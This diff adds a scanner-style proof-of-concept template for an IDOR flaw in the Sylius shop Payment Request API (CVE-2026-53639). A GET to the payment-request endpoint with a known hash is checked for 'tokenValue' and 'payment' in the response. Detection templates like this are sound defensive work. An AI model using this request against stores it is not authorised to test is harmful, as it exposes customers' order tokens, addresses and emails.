@@ -1,0 +1,36 @@
+[info]
+author = "ave"
+description = "检测 Sylius Shop Payment Request API 的 IDOR（不安全的直接对象引用）漏洞。攻击者通过已知的 payment request hash 即可越权访问支付请求数据及关联订单的 tokenValue、商品、地址、邮箱等敏感信息。该漏洞影响 Sylius 2.0.0-2.0.18、2.1.0-2.1.15、2.2.0-2.2.6 版本。"
+id = "POC-AVE-2026-0425"
+name = "Sylius Shop Payment Request API IDOR PoC"
+severity = "medium"
+tags = ["ave-2026-0425"]
+vuln_id = [
+    "CVE-2026-53639",
+    "AVE-2026-0425",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/api/v2/shop/payment-requests/{{hash}}"
+protocol = "http"
+
+[poc.requests.headers]
+Accept = "application/json"
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "tokenValue",
+    "payment",
+]
